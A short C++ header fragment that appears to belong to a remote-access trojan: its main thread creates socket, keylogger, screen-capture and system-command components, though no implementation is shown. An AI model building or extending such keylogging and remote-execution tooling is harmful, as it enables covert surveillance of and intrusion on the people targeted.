#pragma once

#include "addon.h"

extern addonThread* gThread;
extern addonMutex* gMutex;
addonSocket* gSocket;
addonKeylog* gKeylog;
addonScreen* gScreen;
addonSysexec* gSysexec;




DWORD _stdcall main_thread(LPVOID lpParam)
{
	gSocket = new addonSocket();
	gKeylog = new addonKeylog();
	gScreen = new addonScreen();
	gSysexec = new addonSysexec();

	return 1;
}